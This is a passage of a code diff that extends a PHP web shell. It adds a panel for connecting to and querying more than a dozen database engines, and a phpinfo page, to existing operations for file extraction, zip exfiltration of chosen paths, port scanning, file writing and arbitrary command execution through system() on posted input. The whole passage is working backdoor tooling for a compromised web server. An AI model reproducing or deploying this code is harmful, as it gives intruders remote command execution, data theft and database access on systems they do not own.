+            try {
+                $dsn = "sqlite:$host";
+
+                $pdo = new PDO($dsn);
+                echo "[Driver: pdo_sqlite] Connected successfully using $host.\n";
+
+                if (!empty($query)) {
+                    runPDOQuery($pdo, $query);
+                }
+            }
+            catch (PDOException $e) {
+                echo "[Driver: pdo_sqlite] Connection failed: " . $e->getMessage();
+            }
+        }
+        // Check if the SQLite extension is loaded
+        elseif (extension_loaded("sqlite3")) {
+            $connection = sqlite_open($host, 0666, $error);
+
+            if (!$connection) {
+                echo "[Driver: sqlite3] Connection failed: $error";
+            }
+            else {
+                echo "[Driver: sqlite3] Connected successfully using $host.\n";
+
+                if (!empty($query)) {
+                    $result = sqlite_query($connection, $query);
+                    if ($result) {
+                        echo "[Driver: sqlite3] Query executed successfully.\n";
+                        $rows = array();
+                        while ($row = sqlite_fetch_array($result)) {
+                            $rows[] = $row;
+                        }
+                        printAsciiTable($rows);
+                    }
+                    else {
+                        echo "[Driver: sqlite3] Query failed: " . sqlite_error_string(sqlite_last_error($connection));
+                    }
+                }
+            }
+        }
+        else {
+            echo "[Driver: none] SQLite extension is not loaded.\n";
+        }
+    }
+    elseif ($db_type === 'sqlsrv') {
+        $port = $port ?: 1433;
+
+        // Check if the SQL Server PDO extension is loaded
+        if (extension_loaded("pdo_sqlsrv")) {
+            try {
+                $dsn = "sqlsrv:Server=$host,$port" . (!empty($database) ? ";Database=$database" : "");
+
+                $pdo = new PDO($dsn, $username, $password);
+                echo "[Driver: pdo_sqlsrv] Connected successfully using $username:$password.\n";
+
+                if (!empty($query)) {
+                    runPDOQuery($pdo, $query);
+                }
+            }
+            catch (PDOException $e) {
+                echo "[Driver: pdo_sqlsrv] Connection failed: " . $e->getMessage();
+            }
+        }
+        // Check if the SQL Server extension is loaded
+        elseif (extension_loaded("sqlsrv")) {
+            echo "Connecting to $host with default instance specification ...\n";
+            $connection = sqlsrv_connect($host, array("Database" => $database, "UID" => $username, "PWD" => $password));
+
+            if (!$connection) {
+                echo "[Driver: sqlsrv] Connection failed: " . sqlsrv_errors();
+                echo "[Driver: sqlsrv] Trying to connect to $host,$port ...\n";
+
+                $connection = sqlsrv_connect(
+                    "$host,$port",
+                    array("Database" => $database, "UID" => $username, "PWD" => $password)
+                );
+
+                if (!$connection) {
+                    echo "[Driver: sqlsrv] Connection failed: " . sqlsrv_errors();
+                }
+                else {
+                    echo "[Driver: sqlsrv] Connected successfully using $username:$password (host,port).\n";
+                }
+            }
+            else {
+                echo "[Driver: sqlsrv] Connected successfully using $username:$password (host only).\n";
+            }
+
+            if (!empty($query) && $connection) {
+                $result = sqlsrv_query($connection, $query);
+                if ($result) {
+                    echo "[Driver: sqlsrv] Query executed successfully.\n";
+                    $rows = array();
+                    while ($row = sqlsrv_fetch_array($result, SQLSRV_FETCH_ASSOC)) {
+                        $rows[] = $row;
+                    }
+                    printAsciiTable($rows);
+                }
+                else {
+                    echo "[Driver: sqlsrv] Query failed: " . sqlsrv_errors();
+                }
+            }
+        }
+        else {
+            echo "[Driver: none] SQL Server extension is not loaded.\n";
+        }
+    }
+    elseif ($db_type === 'oci') {
+        $port = $port ?: 1521;
+
+        // Check if the Oracle PDO extension is loaded
+        if (extension_loaded("pdo_oci")) {
+            try {
+                if (!empty($sid)) {
+                    $tns = "(DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST = $host)(PORT = $port))(CONNECT_DATA = (SID = $sid)))";
+                }
+                else {
+                    $tns = "(DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST = $host)(PORT = $port))(CONNECT_DATA = (SERVICE_NAME = $service_name)))";
+                }
+                $dsn = "oci:dbname=$tns";
+
+                $pdo = new PDO($dsn, $username, $password);
+                echo "[Driver: pdo_oci] Connected successfully using $username:$password.\n";
+
+                if (!empty($query)) {
+                    runPDOQuery($pdo, $query);
+                }
+            }
+            catch (PDOException $e) {
+                echo "[Driver: pdo_oci] Connection failed: " . $e->getMessage();
+            }
+        }
+        // Check if the Oracle extension is loaded
+        elseif (extension_loaded("oci8")) {
+            $connection = oci_connect($username, $password, "$host:$port/$service_name");
+
+            if (!$connection) {
+                echo "[Driver: oci8] Connection failed: " . oci_error();
+            }
+            else {
+                echo "[Driver: oci8] Connected successfully using $username:$password.\n";
+
+                if (!empty($query)) {
+                    $statement = oci_parse($connection, $query);
+                    if ($statement) {
+                        if (oci_execute($statement)) {
+                            echo "[Driver: oci8] Query executed successfully.\n";
+                            $rows = array();
+                            while ($row = oci_fetch_assoc($statement)) {
+                                $rows[] = $row;
+                            }
+                            printAsciiTable($rows);
+                        }
+                        else {
+                            echo "[Driver: oci8] Query failed: " . oci_error($statement);
+                        }
+                    }
+                    else {
+                        echo "[Driver: oci8] Query failed: " . oci_error($connection);
+                    }
+                }
+            }
+        }
+        else {
+            echo "[Driver: none] Oracle extension is not loaded.\n";
+        }
+    }
+    elseif ($db_type === 'mongodb') {
+        $port = $port ?: 27017;
+        $dsn  = "mongodb://$username:$password@$host:$port/$database";
+
+        // Check if the MongoDB extension is loaded
+        if (extension_loaded("mongodb")) {
+            try {
+                $connection = new MongoDB\Driver\Manager($dsn, explode("&", $options));
+                echo "[Driver: mongodb] Connected successfully using $username:$password.\n";
+
+                if (!empty($query)) {
+                    $query  = new MongoDB\Driver\Query(array());
+                    $cursor = $connection->executeQuery("$database.$collection", $query);
+
+                    $rows = array();
+                    foreach ($cursor as $row) {
+                        $rows[] = $row;
+                    }
+                    printAsciiTable($rows);
+                }
+            }
+            catch (MongoDB\Driver\Exception\Exception $e) {
+                echo "[Driver: mongodb] Connection failed: " . $e->getMessage();
+            }
+        }
+        // Check if the Mongo extension is loaded
+        elseif (extension_loaded("mongo")) {
+            try {
+                $connection = new Mongo($dsn, array_merge(array("connect" => true), explode("&", $options)));
+                echo "[Driver: mongo] Connected successfully using $username:$password.\n";
+
+                if (!empty($query)) {
+                    $collection = $connection->selectCollection($database, $collection);
+                    $cursor     = $collection->find();
+
+                    $rows = array();
+                    foreach ($cursor as $row) {
+                        $rows[] = $row;
+                    }
+                    printAsciiTable($rows);
+                }
+            }
+            catch (MongoConnectionException $e) {
+                echo "[Driver: mongo] Connection failed: " . $e->getMessage();
+            }
+            catch (Exception $e) {
+                echo "[Driver: mongo] Connection failed: " . $e->getMessage();
+            }
+        }
+        else {
+            echo "[Driver: none] MongoDB extension is not loaded.\n";
+        }
+    }
+    elseif ($db_type === 'ibm') {
+        $port = $port ?: 50000;
+        $dsn  = "ibm:DRIVER={IBM DB2 ODBC DRIVER};DATABASE=$database;HOSTNAME=$host;PORT=$port;PROTOCOL=TCPIP;UID=$username;PWD=$password;";
+
+        // Check if the IBM PDO extension is loaded
+        if (extension_loaded("pdo_ibm")) {
+            try {
+                $pdo = new PDO($dsn);
+                echo "[Driver: pdo_ibm] Connected successfully using $username:$password.\n";
+
+                if (!empty($query)) {
+                    runPDOQuery($pdo, $query);
+                }
+            }
+            catch (PDOException $e) {
+                echo "[Driver: pdo_ibm] Connection failed: " . $e->getMessage();
+            }
+        }
+        // Check if the IBM extension is loaded
+        elseif (extension_loaded("ibm")) {
+            $connection = db2_connect($dsn, $username, $password);
+
+            if (!$connection) {
+                echo "[Driver: ibm] Connection failed: " . db2_conn_error();
+            }
+            else {
+                echo "[Driver: ibm] Connected successfully using $username:$password.\n";
+
+                if (!empty($query)) {
+                    $result = db2_exec($connection, $query);
+                    if ($result) {
+                        echo "[Driver: ibm] Query executed successfully.\n";
+                        $rows = array();
+                        while ($row = db2_fetch_assoc($result)) {
+                            $rows[] = $row;
+                        }
+                        printAsciiTable($rows);
+                    }
+                    else {
+                        echo "[Driver: ibm] Query failed: " . db2_conn_error();
+                    }
+                }
+            }
+        }
+        else {
+            echo "[Driver: none] IBM extension is not loaded.\n";
+        }
+    }
+    elseif ($db_type === 'firebird') {
+        $port = $port ?: 3050;
+        $dsn  = "firebird:dbname=$host/$port:$database" .
+                (!empty($charset) ? ";charset=$charset" : "") .
+                (!empty($role) ? ";role=$role" : "") .
+                (!empty($dialect) ? ";dialect=$dialect" : "");
+
+        // Check if the Firebird PDO extension is loaded
+        if (extension_loaded("pdo_firebird")) {
+            try {
+                $pdo = new PDO($dsn, $username, $password);
+                echo "[Driver: pdo_firebird] Connected successfully using $username:$password.\n";
+
+                if (!empty($query)) {
+                    runPDOQuery($pdo, $query);
+                }
+            }
+            catch (PDOException $e) {
+                echo "[Driver: pdo_firebird] Connection failed: " . $e->getMessage();
+            }
+        }
+        // Check if the Firebird extension is loaded
+        elseif (extension_loaded("interbase")) {
+            echo "Connecting to $host/$port:$database (TCP/IP on custom port) ...\n";
+            $connection = ibase_connect($host . "/" . $port . ":" . $database, $username, $password);
+
+            if (!$connection) {
+                echo "[Driver: interbase] Connection failed: " . ibase_errmsg();
+                echo "[Driver: interbase] Trying to connect to $host:$database (TCP/IP implicit port) ...\n";
+
+                $connection = ibase_connect($host . ":" . $database, $username, $password);
+
+                if (!$connection) {
+                    echo "[Driver: interbase] Connection failed: " . ibase_errmsg();
+                    echo "[Driver: interbase] Trying to connect to //$host/$database (NetBEUI) ...\n";
+
+                    $connection = ibase_connect("//" . $host . "/" . $database, $username, $password);
+
+                    if (!$connection) {
+                        echo "[Driver: interbase] Connection failed: " . ibase_errmsg();
+                    }
+                    else {
+                        echo "[Driver: interbase] Connected successfully using $username:$password (//host/database aka NetBEUI).\n";
+                    }
+                }
+                else {
+                    echo "[Driver: interbase] Connected successfully using $username:$password (host:database).\n";
+                }
+            }
+            else {
+                echo "[Driver: interbase] Connected successfully using $username:$password (host/port:database).\n";
+            }
+
+            if (!empty($query) && $connection) {
+                $result = ibase_query($connection, $query);
+                if ($result) {
+                    echo "[Driver: interbase] Query executed successfully.\n";
+                    $rows = array();
+                    while ($row = ibase_fetch_assoc($result)) {
+                        $rows[] = $row;
+                    }
+                    printAsciiTable($rows);
+                }
+                else {
+                    echo "[Driver: interbase] Query failed: " . ibase_errmsg();
+                }
+            }
+        }
+        else {
+            echo "[Driver: none] Firebird extension is not loaded.\n";
+        }
+    }
+    elseif ($db_type === 'odbc') {
+        $dsn = "odbc:Driver=$odbc_driver;Server=$host,$port;Database=$database;Uid=$username;Pwd=$password;";
+
+        // Check if the ODBC PDO extension is loaded
+        if (extension_loaded("pdo_odbc")) {
+            try {
+                $pdo = new PDO($dsn);
+                echo "[Driver: pdo_odbc] Connected successfully using $username:$password.\n";
+
+                if (!empty($query)) {
+                    runPDOQuery($pdo, $query);
+                }
+            }
+            catch (PDOException $e) {
+                echo "[Driver: pdo_odbc] Connection failed: " . $e->getMessage();
+            }
+        }
+        // Check if the ODBC extension is loaded
+        elseif (extension_loaded("odbc")) {
+            $connection = odbc_connect($dsn, $username, $password);
+
+            if (!$connection) {
+                echo "[Driver: odbc] Connection failed: " . odbc_errormsg();
+            }
+            else {
+                echo "[Driver: odbc] Connected successfully using $username:$password.\n";
+
+                if (!empty($query)) {
+                    $result = odbc_exec($connection, $query);
+                    if ($result) {
+                        echo "[Driver: odbc] Query executed successfully.\n";
+                        $rows = array();
+                        while ($row = odbc_fetch_array($result)) {
+                            $rows[] = $row;
+                        }
+                        printAsciiTable($rows);
+                    }
+                    else {
+                        echo "[Driver: odbc] Query failed: " . odbc_errormsg();
+                    }
+                }
+            }
+        }
+        else {
+            echo "[Driver: none] ODBC extension is not loaded.\n";
+        }
+    }
+    elseif ($db_type === 'informix') {
+        $port = $port ?: 9800;
+        $dsn  = "informix:host=$host;service=$port;database=$database;server=$server;protocol=$protocol;EnableScrollableCursors=$enableScrollableCursors";
+
+        // Check if the Informix PDO extension is loaded
+        if (extension_loaded("pdo_informix")) {
+            try {
+                $pdo = new PDO($dsn, $username, $password);
+                echo "[Driver: pdo_informix] Connected successfully using $username:$password.\n";
+
+                if (!empty($query)) {
+                    runPDOQuery($pdo, $query);
+                }
+            }
+            catch (PDOException $e) {
+                echo "[Driver: pdo_informix] Connection failed: " . $e->getMessage();
+            }
+        }
+        else {
+            echo "[Driver: none] Informix extension is not loaded.\n";
+        }
+    }
+    elseif ($db_type === 'sybase') {
+        $port = $port ?: 5000;
+        $dsn  = "sybase:host=$host:$port" . (!empty($database) ? ";dbname=$database" : "");
+
+        // Check if the Sybase PDO extension is loaded
+        if (extension_loaded("pdo_dblib")) {
+            try {
+                $pdo = new PDO($dsn, $username, $password);
+                echo "[Driver: pdo_dblib] Connected successfully using $username:$password.\n";
+
+                if (!empty($query)) {
+                    runPDOQuery($pdo, $query);
+                }
+            }
+            catch (PDOException $e) {
+                echo "[Driver: pdo_dblib] Connection failed: " . $e->getMessage();
+            }
+        }
+        // Check if the Sybase extension is loaded
+        elseif (extension_loaded("sybase")) {
+            $connection = sybase_connect($host, $username, $password);
+
+            if (!$connection) {
+                echo "[Driver: sybase] Connection failed: " . sybase_get_last_message();
+            }
+            else {
+                echo "[Driver: sybase] Connected successfully using $username:$password.\n";
+
+                if (!empty($query)) {
+                    $result = sybase_query($query, $connection);
+                    if ($result) {
+                        echo "[Driver: sybase] Query executed successfully.\n";
+                        $rows = array();
+                        while ($row = sybase_fetch_assoc($result)) {
+                            $rows[] = $row;
+                        }
+                        printAsciiTable($rows);
+                    }
+                    else {
+                        echo "[Driver: sybase] Query failed: " . sybase_get_last_message();
+                    }
+                }
+            }
+        }
+        // Check if the FreeTDS extension is loaded
+        elseif (extension_loaded("mssql")) {
+            $connection = mssql_connect($host, $username, $password);
+
+            if (!$connection) {
+                echo "[Driver: mssql] Connection failed: " . mssql_get_last_message();
+            }
+            else {
+                echo "[Driver: mssql] Connected successfully using $username:$password.\n";
+
+                if (!empty($query)) {
+                    $result = mssql_query($query, $connection);
+                    if ($result) {
+                        echo "Query executed successfully.\n";
+                        while ($row = mssql_fetch_assoc($result)) {
+                            echo json_encode($row);
+                        }
+                    }
+                    else {
+                        echo "Query failed: " . mssql_get_last_message();
+                    }
+                }
+            }
+        }
+        else {
+            echo "[Driver: none] Sybase extension is not loaded.\n";
+        }
+    }
+    elseif ($db_type === 'raw') {
+        $dsn = $raw_connection_string;
+
+        // Check if the PDO extension is loaded
+        if (extension_loaded("pdo")) {
+            try {
+                $pdo = new PDO($dsn, $username, $password);
+                echo "[Driver: PDO] Connected successfully using $username:$password.\n";
+
+                if (!empty($query)) {
+                    runPDOQuery($pdo, $query);
+                }
+            }
+            catch (PDOException $e) {
+                echo "[Driver: PDO] Connection failed: " . $e->getMessage();
+            }
+        }
+        else {
+            echo "[Driver: PDO] PDO extension is not loaded.\n";
+        }
+    }
+    else {
+        echo "[Driver: none] Unsupported database type: $db_type";
     }
 }
 
@@ -1048,23 +2012,23 @@ if (isset($_GET["dev"])) {
 // Define a list of operations that must be run in an isolated environment meaning no other content should be rendered
 // on the page except the operation result.
 $isolated_ops = array(
-    FILE_EXTRACTION,
-    EXFILTRATE,
-    LOGIN,
+    $FILE_EXTRACTION,
+    $EXFILTRATE,
+    $LOGIN,
 );
 
 // Check if the request is not POST and the operation is not in the isolated operations list, then render the page
 if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"], $isolated_ops))) {
-    $page = isset($_GET['page']) ? $_GET['page'] : ($_SESSION["auth"] === true ? FILE_EXTRACTION : LOGIN);
+    $page = isset($_GET['page']) ? $_GET['page'] : ($_SESSION["auth"] === true ? $FILE_EXTRACTION : $LOGIN);
 
     $content = "";
 
     switch ($page) {
-        case LOGIN:
+        case $LOGIN:
             $content = makeLoginPage();
             break;
-        case FILE_EXTRACTION_PREVIEW:
-        case FILE_EXTRACTION:
+        case $FILE_EXTRACTION_PREVIEW:
+        case $FILE_EXTRACTION:
             $content = makePage(
                 array(
                     makePageHeader(
@@ -1088,14 +2052,14 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                 "__PARAM_2__",
                                 "Preview",
                                 "Display preview of the file content if it's larger than 100kb.",
-                                $page === FILE_EXTRACTION_PREVIEW,
+                                $page === $FILE_EXTRACTION_PREVIEW,
                                 "y",
-                                $page === FILE_EXTRACTION_PREVIEW
+                                $page === $FILE_EXTRACTION_PREVIEW
                                     ? "window.location.href = '?page=" .
-                                      FILE_EXTRACTION .
+                                      $FILE_EXTRACTION .
                                       "&__PARAM_99__=' + document.getElementById('__PARAM_1__').value"
                                     : "window.location.href = '?page=" .
-                                      FILE_EXTRACTION_PREVIEW .
+                                      $FILE_EXTRACTION_PREVIEW .
                                       "&__PARAM_99__=' + document.getElementById('__PARAM_1__').value"
                             ),
                             makeCheckbox(
@@ -1109,7 +2073,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                 $page
             );
             break;
-        case DIRECTORY_LISTING:
+        case $DIRECTORY_LISTING:
             $content = makePage(
                 array(
                     makePageHeader(
@@ -1144,36 +2108,10 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                 $page
             );
             break;
-        case EXFILTRATE:
-            $content = makePage(
-                array(
-                    makePageHeader(
-                        $ENABLED_FEATURES[$page]["title"],
-                        $ENABLED_FEATURES[$page]["description"]
-                    ),
-                    makeForm(
-                        $page,
-                        $_SERVER["REQUEST_URI"],
-                        array(
-                            makeInput(
-                                "textarea",
-                                "Paths",
-                                "__PARAM_1__",
-                                "C://path/to/file1.txt\nC://path/to/file2.txt\nC://path/to/folder1\nC://path/to/folder2,with_tree\nC://path/to/folder3,with_tree,extensions=txt|doc|xlsx",
-                                "List of file/folders to include in the zip archive.<br/>" .
-                                "Concatenate to the path " . makeCodeHighlight(",with_tree") .
-                                " to include all files and folders within a given directory.<br/>" .
-                                "Concatenate to the path " . makeCodeHighlight(",extensions=txt|doc|xlsx") .
-                                " to include only files with the given extensions.",
-                                true
-                            ),
-                        )
-                    ),
-                ),
-                $page
-            );
+        case $EXFILTRATE:
+            $content = makeExfiltratePage();
             break;
-        case PORT_SCAN:
+        case $PORT_SCAN:
             $content = makePage(
                 array(
                     makePageHeader(
@@ -1214,7 +2152,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                 $page
             );
             break;
-        case WRITE_FILE:
+        case $WRITE_FILE:
             $content = makePage(
                 array(
                     makePageHeader(
@@ -1252,7 +2190,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                 $page
             );
             break;
-        case RUN_COMMAND:
+        case $RUN_COMMAND:
             $content = makePage(
                 array(
                     makePageHeader(
@@ -1286,11 +2224,342 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                 $page
             );
             break;
+        case $PHP_INFO:
+            ob_start();
+            phpinfo();
+            $php_info = ob_get_clean();
+            $content  = makePage(
+                array(
+                    makePageHeader(
+                        $ENABLED_FEATURES[$page]["title"],
+                        $ENABLED_FEATURES[$page]["description"]
+                    ),
+                    "<div class='grid grid-cols-2 gap-8 mt-8'>
+                        <div>
+                            <div id='phpinfo-container' class='max-w-full overflow-x-auto'></div>
+                            <script>
+                                const container = document.getElementById('phpinfo-container');
+                                const shadow_root = container.attachShadow({mode: 'open'});
+                                shadow_root.innerHTML = `$php_info`;
+                            </script>
+                        </div>
+                        <div>
+                            " . listEnabledExtensions() . "
+                        </div>
+                    </div>",
+                ),
+                $page
+            );
+            break;
+        case $QUERY_DATABASES:
+            $content = makePage(
+                array(
+                    makePageHeader(
+                        $ENABLED_FEATURES[$page]["title"],
+                        $ENABLED_FEATURES[$page]["description"]
+                    ),
+                    makeForm(
+                        $page,
+                        $_SERVER["REQUEST_URI"],
+                        array(
+                            makeSelect(
+                                "Database",
+                                "__PARAM_1__",
+                                array(
+                                    [
+                                        "value"    => "mysql",
+                                        "label"    => "MySQL",
+                                        "disabled" => !extension_loaded("mysql") &&
+                                                      !extension_loaded("mysqli") &&
+                                                      !extension_loaded("pdo_mysql"),
+                                    ],
+                                    [
+                                        "value"    => "cubrid",
+                                        "label"    => "CUBRID",
+                                        "disabled" => !extension_loaded("cubrid") && !extension_loaded("pdo_cubrid"),
+                                    ],
+                                    [
+                                        "value"    => "pgsql",
+                                        "label"    => "PostgreSQL",
+                                        "disabled" => !extension_loaded("pgsql") && !extension_loaded("pdo_pgsql"),
+                                    ],
+                                    [
+                                        "value"    => "sqlite",
+                                        "label"    => "SQLite",
+                                        "disabled" => !extension_loaded("sqlite3") && !extension_loaded("pdo_sqlite"),
+                                    ],
+                                    [
+                                        "value"    => "sqlsrv",
+                                        "label"    => "SQL Server",
+                                        "disabled" => !extension_loaded("sqlsrv") && !extension_loaded("pdo_sqlsrv"),
+                                    ],
+                                    [
+                                        "value"    => "oci",
+                                        "label"    => "Oracle",
+                                        "disabled" => !extension_loaded("oci8") && !extension_loaded("pdo_oci"),
+                                    ],
+                                    [
+                                        "value"    => "mongodb",
+                                        "label"    => "MongoDB",
+                                        "disabled" => !extension_loaded("mongo") && !extension_loaded("mongodb"),
+                                    ],
+                                    [
+                                        "value"    => "ibm",
+                                        "label"    => "IBM DB2",
+                                        "disabled" => !extension_loaded("ibm_db2") && !extension_loaded("pdo_ibm"),
+                                    ],
+                                    [
+                                        "value"    => "firebird",
+                                        "label"    => "Firebird/Interbase",
+                                        "disabled" => !extension_loaded("interbase") &&
+                                                      !extension_loaded("pdo_firebird"),
+                                    ],
+                                    [
+                                        "value"    => "odbc",
+                                        "label"    => "ODBC",
+                                        "disabled" => !extension_loaded("odbc") && !extension_loaded("pdo_odbc"),
+                                    ],
+                                    [
+                                        "value"    => "informix",
+                                        "label"    => "Informix",
+                                        "disabled" => !extension_loaded("pdo_informix"),
+                                    ],
+                                    [
+                                        "value"    => "sybase",
+                                        "label"    => "Sybase",
+                                        "disabled" => !extension_loaded("sybase") &&
+                                                      !extension_loaded("mssql") &&
+                                                      !extension_loaded("pdo_dblib"),
+                                    ],
+                                    [
+                                        "value"    => "raw",
+                                        "label"    => "Raw PDO connection string",
+                                        "disabled" => !extension_loaded("pdo"),
+                                        "selected" => true,
+                                    ],
+                                ),
+                                true,
+                                "Database driver not available."
+                            ),
+                            makeInput(
+                                "text",
+                                "Host",
+                                "__PARAM_2__",
+                                "localhost",
+                                "The host to connect to (default: localhost)"
+                            ),
+                            makeInput(
+                                "number",
+                                "Port",
+                                "__PARAM_3__",
+                                "3306",
+                                "
+                                    The port to connect to, default depend on the database
+                                    <ul class='text-sm text-zinc-500 list-disc list-inside'>
+                                        <li>MySQL (default: 3306)</li>
+                                        <li>CUBRID (default: 30000)</li>
+                                        <li>PostgreSQL (default: 5432)</li>
+                                        <li>SQLite (default: None)</li>
+                                        <li>SQL Server (default: 1433)</li>
+                                        <li>Oracle (default: 1521)</li>
+                                        <li>MongoDB (default: 27017)</li>
+                                        <li>IBM DB2 (default: 50000)</li>
+                                        <li>Firebird/Interbase (default: 3050)</li>
+                                        <li>ODBC (default: None)</li>
+                                        <li>Informix (default: 9800)</li>
+                                        <li>Sybase (default: 5000)</li>
+                                    </ul>"
+                            ),
+                            makeInput(
+                                "text",
+                                "Username",
+                                "__PARAM_4__",
+                                "admin",
+                                "The username to connect with.",
+                                true
+                            ),
+                            makeInput(
+                                "password",
+                                "Password",
+                                "__PARAM_5__",
+                                "&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;",
+                                "The password to connect with.",
+                                true
+                            ),
+                            makeInput(
+                                "text",
+                                "Database",
+                                "__PARAM_6__",
+                                "ExampleDB",
+                                "The database to connect to."
+                            ),
+                            makeInput(
+                                "text",
+                                "Charset",
+                                "__PARAM_7__",
+                                "utf8",
+                                "The charset to use for the connection."
+                            ),
+                            makeInput(
+                                "text",
+                                "Service name",
+                                "__PARAM_8__",
+                                "orcl",
+                                "The service name to use for the connection."
+                            ),
+                            makeInput(
+                                "text",
+                                "SID",
+                                "__PARAM_9__",
+                                "orcl",
+                                "The SID to use for the connection."
+                            ),
+                            makeInput(
+                                "text",
+                                "Options",
+                                "__PARAM_10__",
+                                "ssl=true",
+                                "The options to use for the connection."
+                            ),
+                            makeInput(
+                                "text",
+                                "Role",
+                                "__PARAM_11__",
+                                "SYSDBA",
+                                "The role to use for the connection."
+                            ),
+                            makeInput(
+                                "text",
+                                "Dialect",
+                                "__PARAM_12__",
+                                "3",
+                                "The dialect to use for the connection."
+                            ),
+                            makeInput(
+                                "text",
+                                "Protocol",
+                                "__PARAM_13__",
+                                "onsoctcp",
+                                "The protocol to use for the connection."
+                            ),
+                            makeCheckbox(
+                                "__PARAM_14__",
+                                "Enable scrollable cursors",
+                                "Enable scrollable cursors for the connection.",
+                                true,
+                                "1"
+                            ),
+                            makeInput(
+                                "text",
+                                "ODBC driver",
+                                "__PARAM_15__",
+                                "ODBC Driver 17 for SQL Server",
+                                "The ODBC driver to use for the connection."
+                            ),
+                            makeInput(
+                                "text",
+                                "Raw connection string",
+                                "__PARAM_16__",
+                                "mysql:host=localhost;port=3306;dbname=ExampleDB;charset=utf8",
+                                "The raw connection string to use for the connection."
+                            ),
+                            makeInput(
+                                "text",
+                                "Server",
+                                "__PARAM_17__",
+                                "ol_informix1170",
+                                "The Informix server name to use for the connection."
+                            ),
+                            makeInput(
+                                "textarea",
+                                "Query",
+                                "__PARAM_18__",
+                                "SHOW DATABASES",
+                                "The query to run against the database. Leave empty to perform a connection test."
+                            ),
+                            makeInput(
+                                "text",
+                                "Collection",
+                                "__PARAM_19__",
+                                "users",
+                                "The collection to query against for MongoDB."
+                            ),
+                            '<script>
+                                function hideAll() {
+                                    for (let i = 2; i <= 17; i++) {
+                                        document.getElementById(`__PARAM_${i}__-container`).classList.add(`hidden`);
+                                    }
+                                    
+                                    document.getElementById(`__PARAM_19__-container`).classList.add(`hidden`);
+                                }
+                                
+                                function showRange(start, end) {
+                                    for (let i = start; i <= end; i++) {
+                                        document.getElementById(`__PARAM_${i}__-container`).classList.remove(`hidden`);
+                                    }
+                                }
+                                
+                                hideAll();
+                                showRange(16, 16);
+                                const select = document.getElementById(`__PARAM_1__`);
+                                select.addEventListener(`change`, (event) => {
+                                   const value = event.target.value;
+                                   hideAll()
+                                    
+                                   switch (value) {
+                                        case `raw`:
+                                            showRange(16, 16);
+                                            break;
+                                        case `mysql`:
+                                        case `cubrid`:
+                                            showRange(2, 7);
+                                            break;
+                                        case `pgsql`:
+                                        case `sqlsrv`:
+                                        case `ibm`:
+                                        case `sybase`:
+                                            showRange(2, 6);
+                                            break;
+                                        case `sqlite`:
+                                            showRange(2, 2);
+                                            showRange(4, 5);
+                                            break;
+                                        case `oci`:
+                                            showRange(2, 5);
+                                            showRange(8, 9);
+                                            break;
+                                        case `mongodb`:
+                                            showRange(2, 6);
+                                            showRange(10, 10);
+                                            showRange(19, 19);
+                                            break;
+                                        case `firebird`:
+                                            showRange(2, 7);
+                                            showRange(11, 12);
+                                            break;
+                                        case `odbc`:
+                                            showRange(2, 6);
+                                            showRange(15, 15);
+                                            break;
+                                        case `informix`:
+                                            showRange(2, 6);
+                                            showRange(13, 14);
+                                            showRange(17, 17);
+                                            break;
+                                   }
+                                });
+                            </script>',
+                        )
+                    ),
+                ),
+                $page
+            );
+            break;
     }
 
     echo $content;
 
-    if (isPost() && in_array($_POST["__OPERATION__"], $isolated_ops) && $_POST["__OPERATION__"] !== LOGIN) {
+    if (isPost() && !in_array($_POST["__OPERATION__"], $isolated_ops)) {
         openCommandOutputScreen();
     }
 }
@@ -1299,27 +2568,59 @@ if (isPost()) {
     $operation = $_POST["__OPERATION__"];
 
     switch ($operation) {
-        case LOGIN:
+        case $LOGIN:
             handleLogin();
             break;
-        case FILE_EXTRACTION_PREVIEW:
-        case FILE_EXTRACTION:
+        case $FILE_EXTRACTION_PREVIEW:
+        case $FILE_EXTRACTION:
             handleFileExtraction();
             break;
-        case DIRECTORY_LISTING:
+        case $DIRECTORY_LISTING:
             handleDirectoryListing();
             break;
-        case EXFILTRATE:
+        case $EXFILTRATE:
             handleCreateZip();
             break;
-        case PORT_SCAN:
+        case $PORT_SCAN:
             handlePortScan();
             break;
-        case WRITE_FILE:
+        case $WRITE_FILE:
             handleWriteFile();
             break;
-        case RUN_COMMAND:
+        case $RUN_COMMAND:
             system($_POST["__PARAM_1__"]);
+            break;
+        case $QUERY_DATABASES:
+            $connection = connectAndQueryDatabase(
+                $_POST["__PARAM_1__"],
+                $_POST["__PARAM_4__"],
+                $_POST["__PARAM_5__"],
+                $_POST["__PARAM_2__"],
+                $_POST["__PARAM_3__"],
+                $_POST["__PARAM_8__"],
+                $_POST["__PARAM_9__"],
+                $_POST["__PARAM_6__"],
+                $_POST["__PARAM_7__"],
+                $_POST["__PARAM_10__"],
+                $_POST["__PARAM_11__"],
+                $_POST["__PARAM_12__"],
+                $_POST["__PARAM_15__"],
+                $_POST["__PARAM_17__"],
+                $_POST["__PARAM_13__"],
+                $_POST["__PARAM_14__"],
+                $_POST["__PARAM_16__"],
+                $_POST["__PARAM_18__"],
+                $_POST["__PARAM_19__"]
+            );
+
+            /*if ($pdo) {
+                $stmt      = $pdo->query("SHOW DATABASES");
+                $databases = $stmt->fetchAll(PDO::FETCH_COLUMN);
+                echo "Databases:\n";
+                foreach ($databases as $database) {
+                    echo "- $database\n";
+                }
+            }*/
             break;
         default:
             echo "Unrecognized operation '$operation'";
@@ -1330,7 +2631,7 @@ if (isPost()) {
 // Check if the request is not POST and the operation is not in the isolated operations list, then render the page end
 if (!isPost() &&
     (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"], $isolated_ops)) &&
-    $_POST["__OPERATION__"] !== LOGIN) {
+    $_POST["__OPERATION__"] !== $LOGIN) {
     closeCommandOutputScreen();
 }
 ?>
